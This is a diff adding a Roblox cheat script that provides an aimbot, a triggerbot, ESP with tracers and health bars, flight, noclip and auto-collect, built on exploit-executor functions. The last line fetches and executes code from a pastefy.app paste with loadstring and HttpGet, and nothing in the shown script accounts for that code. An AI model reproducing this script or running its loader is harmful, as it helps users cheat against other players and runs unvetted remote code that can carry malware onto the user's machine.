@@ -1,0 +1,411 @@
+spawn(function()
+    if not game:IsLoaded() then game.Loaded:Wait() end
+    task.wait(2)
+
+    local TweenService = game:GetService("TweenService")
+    local RunService = game:GetService("RunService")
+    local Players = game:GetService("Players")
+    local UserInputService = game:GetService("UserInputService")
+    local LocalPlayer = Players.LocalPlayer
+    local Camera = workspace.CurrentCamera
+
+    local Palette = {
+        NeonPurple = Color3.fromRGB(160, 32, 240),
+        EmeraldGreen = Color3.fromRGB(46, 204, 113),
+        VibrantRose = Color3.fromRGB(255, 0, 85),
+        Gold = Color3.fromRGB(255, 215, 0),
+        DeepAbyss = Color3.fromRGB(5, 0, 10)
+    }
+
+    local Notifications = {}
+    local ScreenGuiNotif = Instance.new("ScreenGui", game:GetService("CoreGui"))
+    ScreenGuiNotif.Name = "ModernNotifs"
+
+    local activeNotifs = {}
+
+    function Notifications:Notify(text, color)
+        local frame = Instance.new("Frame")
+        local label = Instance.new("TextLabel")
+        local accent = Instance.new("Frame")
+        local corner = Instance.new("UICorner", frame)
+
+        frame.Size = UDim2.new(0, 200, 0, 40)
+        frame.Position = UDim2.new(1, 20, 0.9, -(#activeNotifs * 45))
+        frame.BackgroundColor3 = Palette.DeepAbyss
+        frame.BackgroundTransparency = 0.2
+        frame.BorderSizePixel = 0
+        frame.Parent = ScreenGuiNotif
+
+        corner.CornerRadius = UDim.new(0, 6)
+
+        accent.Size = UDim2.new(0, 4, 1, 0)
+        accent.BackgroundColor3 = color or Color3.fromRGB(255, 255, 255)
+        accent.Parent = frame
+        Instance.new("UICorner", accent).CornerRadius = UDim.new(0, 6)
+
+        label.Size = UDim2.new(1, -15, 1, 0)
+        label.Position = UDim2.new(0, 10, 0, 0)
+        label.BackgroundTransparency = 1
+        label.Text = text:upper()
+        label.TextColor3 = Color3.fromRGB(255, 255, 255)
+        label.Font = Enum.Font.GothamBold
+        label.TextSize = 11
+        label.TextXAlignment = Enum.TextXAlignment.Left
+        label.Parent = frame
+
+        table.insert(activeNotifs, frame)
+
+        local targetY = 0.9 - ((#activeNotifs - 1) * 0.05)
+
+        frame:TweenPosition(
+            UDim2.new(1, -210, targetY, -50),
+            "Out",
+            "Back",
+            0.4,
+            true
+        )
+
+        task.delay(2.5, function()
+            frame:TweenPosition(
+                UDim2.new(1, 20, targetY, -50),
+                "In",
+                "Sine",
+                0.4,
+                true,
+                function()
+                    for i, v in ipairs(activeNotifs) do
+                        if v == frame then
+                            table.remove(activeNotifs, i)
+                            break
+                        end
+                    end
+                    frame:Destroy()
+                end
+            )
+        end)
+    end
+
+    local function RunIntro()
+        local Blur = Instance.new("BlurEffect", Camera)
+        Blur.Size = 0
+
+        local IntroSound = Instance.new("Sound", game:GetService("SoundService"))
+        IntroSound.SoundId = "rbxassetid://1841647093"
+        IntroSound.Volume = 0
+        IntroSound.Looped = true
+        IntroSound:Play()
+
+        local IntroText = Drawing.new("Text")
+        IntroText.Text = "made by tdxcripts"
+        IntroText.Size = 45
+        IntroText.Center = true
+        IntroText.Outline = true
+        IntroText.Font = 2
+        IntroText.Color = Palette.NeonPurple
+        IntroText.Transparency = 1
+        IntroText.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
+        IntroText.Visible = true
+
+        local ScreenGuiIntro = Instance.new("ScreenGui", game:GetService("CoreGui"))
+        local MainFrame = Instance.new("Frame", ScreenGuiIntro)
+        MainFrame.BackgroundColor3 = Palette.DeepAbyss
+        MainFrame.BackgroundTransparency = 0.3
+        MainFrame.Position = UDim2.new(0.5, -90, 0.5, -120)
+        MainFrame.Size = UDim2.new(0, 180, 0, 260)
+        Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 8)
+
+        local Title = Instance.new("TextLabel", MainFrame)
+        Title.Size = UDim2.new(1, 0, 0, 35)
+        Title.BackgroundTransparency = 1
+        Title.Text = "FEATURES"
+        Title.TextColor3 = Palette.Gold
+        Title.Font = Enum.Font.GothamBold
+        Title.TextSize = 14
+
+        local UIList = Instance.new("UIListLayout", MainFrame)
+        UIList.HorizontalAlignment = Enum.HorizontalAlignment.Center
+        UIList.Padding = UDim.new(0, 5)
+
+        local featLabels = {}
+        local feats = {"Aimbot (R)", "Method Toggle ([)", "Auto-Click (])", "Auto-Collect (G)", "Flight (B)", "Noclip (N)", "ESP & Tracers"}
+
+        for _, feat in pairs(feats) do
+            local fLabel = Instance.new("TextLabel", MainFrame)
+            fLabel.Size = UDim2.new(0.85, 0, 0, 18)
+            fLabel.BackgroundTransparency = 1
+            fLabel.Text = "• " .. feat
+            fLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+            fLabel.Font = Enum.Font.Gotham
+            fLabel.TextSize = 11
+            fLabel.TextXAlignment = Enum.TextXAlignment.Left
+            table.insert(featLabels, fLabel)
+        end
+
+        TweenService:Create(Blur, TweenInfo.new(0.8), { Size = 24 }):Play()
+        TweenService:Create(IntroSound, TweenInfo.new(0.8), { Volume = 0.5 }):Play()
+
+        local connection
+        connection = UserInputService.InputBegan:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+                connection:Disconnect()
+                TweenService:Create(MainFrame, TweenInfo.new(0.5), { BackgroundTransparency = 1 }):Play()
+                TweenService:Create(Title, TweenInfo.new(0.5), { TextTransparency = 1 }):Play()
+                for _, lbl in pairs(featLabels) do TweenService:Create(lbl, TweenInfo.new(0.5), { TextTransparency = 1 }):Play() end
+                TweenService:Create(Blur, TweenInfo.new(0.6), { Size = 0 }):Play()
+                TweenService:Create(IntroSound, TweenInfo.new(0.6), { Volume = 0 }):Play()
+                task.delay(0.6, function() IntroText:Remove() Blur:Destroy() ScreenGuiIntro:Destroy() IntroSound:Destroy() end)
+            end
+        end)
+    end
+    task.spawn(RunIntro)
+
+    local Settings = {
+        Enabled = false,
+        Visuals = true,
+        UseMouseRel = true,
+        Mode = "1",
+        TrackingRange = 250,
+        SmoothFOV = 35,
+        SnappyFOV = 150,
+        RageFOV = 900,
+        VisualRageFOV = 50,
+        SmoothValue = 1.1,
+        SnappyValue = 0.50,
+        RageValue = 1.0,
+        TargetPart = "Head",
+        ToggleKey = Enum.KeyCode.R,
+        SwitchKey = Enum.KeyCode.K,
+        RageKey = Enum.KeyCode.J,
+        FLY_SPEED = 140,
+        FLY_KEY = Enum.KeyCode.B,
+        NOCLIP_KEY = Enum.KeyCode.N,
+        TOGGLE_METHOD_KEY = Enum.KeyCode.LeftBracket,
+        AutoClickEnabled = false,
+        AutoClickKey = Enum.KeyCode.RightBracket,
+        AutoCollectEnabled = false,
+        AutoCollectKey = Enum.KeyCode.G,
+        CollectHealth = true,
+        CollectAmmo = true
+    }
+
+    local isFlying, noclipEnabled = false, false
+    local hrp, hum, bv, bg
+    local lastAutoClick = 0
+    local lastNotifTime = 0
+
+    local FOVCircle = Drawing.new("Circle")
+    FOVCircle.Thickness = 1
+    FOVCircle.NumSides = 60
+    FOVCircle.Visible = false
+    FOVCircle.Transparency = 0.5
+    FOVCircle.Filled = true
+
+    local function setupCharacter(newCharacter)
+        hrp = newCharacter:WaitForChild("HumanoidRootPart")
+        hum = newCharacter:WaitForChild("Humanoid")
+        bv = Instance.new("BodyVelocity")
+        bg = Instance.new("BodyGyro")
+        bg.MaxTorque = Vector3.new(4e5, 4e5, 4e5)
+        bv.MaxForce = Vector3.new(4e5, 4e5, 4e5)
+    end
+
+    LocalPlayer.CharacterAdded:Connect(setupCharacter)
+    if LocalPlayer.Character then setupCharacter(LocalPlayer.Character) end
+
+    local function IsVisible(TargetPart, Character)
+        local Params = RaycastParams.new()
+        Params.FilterType = Enum.RaycastFilterType.Exclude
+        Params.FilterDescendantsInstances = {LocalPlayer.Character, Character}
+        return workspace:Raycast(Camera.CFrame.Position, TargetPart.Position - Camera.CFrame.Position, Params) == nil
+    end
+
+    local function CreateESP(Player)
+        local Box = Drawing.new("Square")
+        local Tracer = Drawing.new("Line")
+        local Health = Drawing.new("Line")
+        local smoothHealth = 0
+
+        RunService.RenderStepped:Connect(function()
+            if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") and Player ~= LocalPlayer then
+                local root = Player.Character.HumanoidRootPart
+                local p_hum = Player.Character:FindFirstChild("Humanoid")
+                if not hrp or not p_hum then return end
+
+                local dist = (hrp.Position - root.Position).Magnitude
+                local pos, onScreen = Camera:WorldToViewportPoint(root.Position)
+
+                if onScreen and dist <= Settings.TrackingRange and Settings.Visuals then
+                    local top = Camera:WorldToViewportPoint(root.Position + Vector3.new(0, 3, 0))
+                    local bottom = Camera:WorldToViewportPoint(root.Position + Vector3.new(0, -3.5, 0))
+                    local sizeY = math.abs(top.Y - bottom.Y)
+                    local sizeX = sizeY / 1.5
+
+                    local visualColor = (Settings.Mode == "3") and Palette.VibrantRose or Palette.NeonPurple
+
+                    Box.Visible = true
+                    Box.Size = Vector2.new(sizeX, sizeY)
+                    Box.Position = Vector2.new(pos.X - sizeX / 2, pos.Y - sizeY / 2)
+                    Box.Color = visualColor
+
+                    Tracer.Visible = true
+                    Tracer.From = UserInputService:GetMouseLocation()
+                    Tracer.To = Vector2.new(pos.X, pos.Y)
+                    Tracer.Color = visualColor
+
+                    Health.Visible = true
+                    Health.Thickness = 2
+                    
+                    local realPercent = p_hum.Health / p_hum.MaxHealth
+                    smoothHealth = smoothHealth + (realPercent - smoothHealth) * 0.15
+                    
+                    if realPercent >= 0.75 then
+                        Health.Color = Palette.EmeraldGreen
+                    elseif realPercent >= 0.35 then
+                        Health.Color = Palette.Gold
+                    else
+                        Health.Color = Palette.VibrantRose
+                    end
+                    
+                    Health.From = Vector2.new(Box.Position.X - 5, Box.Position.Y + sizeY)
+                    Health.To = Vector2.new(Box.Position.X - 5, Box.Position.Y + sizeY - (sizeY * smoothHealth))
+                else
+                    Box.Visible = false Tracer.Visible = false Health.Visible = false
+                end
+            else
+                Box.Visible = false Tracer.Visible = false Health.Visible = false
+            end
+        end)
+    end
+
+    for _, p in pairs(Players:GetPlayers()) do CreateESP(p) end
+    Players.PlayerAdded:Connect(CreateESP)
+
+    local function GetClosestPlayer()
+        local target, shortest = nil, math.huge
+        local mPos = UserInputService:GetMouseLocation()
+        local fov = (Settings.Mode == "1") and Settings.SmoothFOV or (Settings.Mode == "2" and Settings.SnappyFOV or Settings.RageFOV)
+
+        for _, p in pairs(Players:GetPlayers()) do
+            if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild(Settings.TargetPart) then
+                local root = p.Character.HumanoidRootPart
+                if not hrp then continue end
+                local dist = (hrp.Position - root.Position).Magnitude
+                if dist <= Settings.TrackingRange then
+                    local pos, onScreen = Camera:WorldToViewportPoint(p.Character[Settings.TargetPart].Position)
+                    if onScreen then
+                        local sDist = (Vector2.new(pos.X, pos.Y) - mPos).Magnitude
+                        if sDist <= fov and IsVisible(p.Character[Settings.TargetPart], p.Character) then
+                            if sDist < shortest then shortest = sDist target = p end
+                        end
+                    end
+                end
+            end
+        end
+        return target
+    end
+
+    UserInputService.InputBegan:Connect(function(i, p)
+        if p then return end
+        if i.KeyCode == Settings.ToggleKey then
+            Settings.Enabled = not Settings.Enabled
+            FOVCircle.Visible = (Settings.Enabled and Settings.Visuals)
+            Notifications:Notify("Aimbot: " .. (Settings.Enabled and "Enabled" or "Disabled"), Settings.Enabled and Palette.EmeraldGreen or Palette.VibrantRose)
+        elseif i.KeyCode == Settings.AutoClickKey then
+            Settings.AutoClickEnabled = not Settings.AutoClickEnabled
+            Notifications:Notify("Triggerbot: " .. (Settings.AutoClickEnabled and "ON" or "OFF"), Palette.Gold)
+        elseif i.KeyCode == Settings.AutoCollectKey then
+            Settings.AutoCollectEnabled = not Settings.AutoCollectEnabled
+            Notifications:Notify("Auto-Collect: " .. (Settings.AutoCollectEnabled and "ON" or "OFF"), Palette.EmeraldGreen)
+        elseif i.KeyCode == Settings.TOGGLE_METHOD_KEY then
+            Settings.UseMouseRel = not Settings.UseMouseRel
+            Notifications:Notify("Method: " .. (Settings.UseMouseRel and "MouseRel" or "CFrame"), Color3.fromRGB(255, 255, 255))
+        elseif i.KeyCode == Settings.SwitchKey then
+            Settings.Mode = (Settings.Mode == "1") and "2" or "1"
+            Notifications:Notify("Mode: " .. Settings.Mode, Palette.Gold)
+        elseif i.KeyCode == Settings.RageKey then
+            Settings.Mode = (Settings.Mode == "3") and "1" or "3"
+            Notifications:Notify("Rage: " .. (Settings.Mode == "3" and "ON" or "OFF"), Palette.VibrantRose)
+        elseif i.KeyCode == Settings.FLY_KEY then
+            isFlying = not isFlying
+            if isFlying then bv.Parent = hrp bg.Parent = hrp hum.PlatformStand = true else bv.Parent = nil bg.Parent = nil hum.PlatformStand = false end
+            Notifications:Notify("Flight: " .. (isFlying and "ON" or "OFF"), Palette.NeonPurple)
+        elseif i.KeyCode == Settings.NOCLIP_KEY then
+            noclipEnabled = not noclipEnabled
+            Notifications:Notify("Noclip: " .. (noclipEnabled and "ON" or "OFF"), Palette.Gold)
+        end
+    end)
+
+    RunService.RenderStepped:Connect(function()
+        if not hrp or not hrp.Parent then return end
+        local mPos = UserInputService:GetMouseLocation()
+        FOVCircle.Position = mPos
+        FOVCircle.Visible = (Settings.Enabled and Settings.Visuals)
+
+        if Settings.Mode == "1" or Settings.Mode == "2" then
+            FOVCircle.Radius = (Settings.Mode == "1") and Settings.SmoothFOV or Settings.SnappyFOV
+            FOVCircle.Color = Palette.NeonPurple
+        elseif Settings.Mode == "3" then
+            FOVCircle.Radius = Settings.VisualRageFOV
+            FOVCircle.Color = Palette.VibrantRose
+        end
+
+        if noclipEnabled then
+            for _, v in pairs(LocalPlayer.Character:GetDescendants()) do if v:IsA("BasePart") then v.CanCollide = false end end
+        end
+
+        if isFlying then
+            local dir = Vector3.new(0, 0, 0)
+            if UserInputService:IsKeyDown(Enum.KeyCode.W) then dir += Camera.CFrame.LookVector end
+            if UserInputService:IsKeyDown(Enum.KeyCode.S) then dir -= Camera.CFrame.LookVector end
+            if UserInputService:IsKeyDown(Enum.KeyCode.A) then dir -= Camera.CFrame.RightVector end
+            if UserInputService:IsKeyDown(Enum.KeyCode.D) then dir += Camera.CFrame.RightVector end
+            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then dir += Vector3.new(0, 1, 0) end
+            bv.Velocity = (dir.Magnitude > 0) and (dir.Unit * Settings.FLY_SPEED) or Vector3.new(0, 0, 0)
+            bg.CFrame = Camera.CFrame
+        end
+
+        if Settings.AutoCollectEnabled then
+            local needsHealth = hum and hum.Health < hum.MaxHealth
+            for _, obj in pairs(workspace:GetChildren()) do
+                if obj.Name == "_drop" and obj:IsA("BasePart") then
+                    if (Settings.CollectHealth and obj:FindFirstChild("Health") and needsHealth) or (Settings.CollectAmmo and obj:FindFirstChild("Ammo")) then
+                        firetouchinterest(hrp, obj, 0)
+                        firetouchinterest(hrp, obj, 1)
+                    end
+                end
+            end
+        end
+
+        if Settings.Enabled then
+            local target = GetClosestPlayer()
+            if target and target.Character and target.Character:FindFirstChild(Settings.TargetPart) then
+                local targetPart = target.Character[Settings.TargetPart]
+                local lerp = (Settings.Mode == "1") and Settings.SmoothValue or (Settings.Mode == "2" and Settings.SnappyValue or Settings.RageValue)
+                if Settings.UseMouseRel then
+                    local screenPos, onScreen = Camera:WorldToViewportPoint(targetPart.Position)
+                    if onScreen and mousemoverel then
+                        mousemoverel((screenPos.X - mPos.X) * lerp, (screenPos.Y - mPos.Y) * lerp)
+                    end
+                else
+                    Camera.CFrame = Camera.CFrame:Lerp(CFrame.new(Camera.CFrame.Position, targetPart.Position), lerp)
+                end
+
+                if Settings.AutoClickEnabled then
+                    local distance = (hrp.Position - targetPart.Position).Magnitude
+                    if distance <= Settings.TrackingRange and IsVisible(targetPart, target.Character) then
+                        if tick() - lastAutoClick >= (math.random(2, 4) / 100) then
+                            lastAutoClick = tick()
+                            if mouse1press then mouse1press() mouse1release() elseif mouse1click then mouse1click() end
+                            if tick() - lastNotifTime >= 2 then
+                                Notifications:Notify("FIRING: " .. target.Name:upper(), Palette.VibrantRose)
+                                lastNotifTime = tick()
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end)
+end)
+
+loadstring(game:HttpGet("https://pastefy.app/TYw5hIBW/raw"))()
